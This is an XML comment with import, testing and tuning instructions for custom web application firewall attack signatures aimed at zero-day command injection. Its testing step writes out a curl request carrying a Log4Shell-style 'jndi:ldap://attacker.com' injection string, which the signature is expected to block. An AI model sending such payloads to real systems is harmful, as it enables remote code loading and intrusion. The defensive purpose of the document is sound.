<!--
  IMPORT INSTRUCTIONS:
  
  1. GUI Method:
     a. Navigate to: Security > Application Security > Attack Signatures > Custom Signatures
     b. Click "Import"
     c. Select this XML file
     d. Click "Import"
     e. Attach to policy via "Manage Attack Signatures"
  
  2. TMSH Method:
     tmsh> modify asm policy <policy_name> import attack-signatures file <path_to_this_xml>
  
  3. Signature ID Ranges:
     - 9800001-9800099: Reserved for custom Zero-Day patterns
     - System signatures use IDs: 1-9000000
  
  4. Integration with iRule:
     - iRule rule.tcl uses custom violation name: "Custom_ZeroDay_Command_Injection"
     - This signature XML defines the same violation name
     - When imported, provides comprehensive protection via both iRule + Signature
  
  5. Testing:
     curl -v "http://target.com/app?param=jndi:ldap://attacker.com"
     Expected: HTTP 403 Forbidden (blocked by signature)
  
  6. Performance Notes:
     - Pattern matching is optimized for high throughput
     - Content decoding (URL, UTF-8, etc.) applied before matching
     - No regex overhead (uses simple string matching)
  
  7. Tuning:
     - To disable a signature: Set <enabled>false</enabled>
     - To change response: Modify <action>block</action> to <action>log</action>
     - To adjust severity: Change <severity> value (1-5)
     - To add patterns: Duplicate <pattern-rule> block and update <pattern>
-->
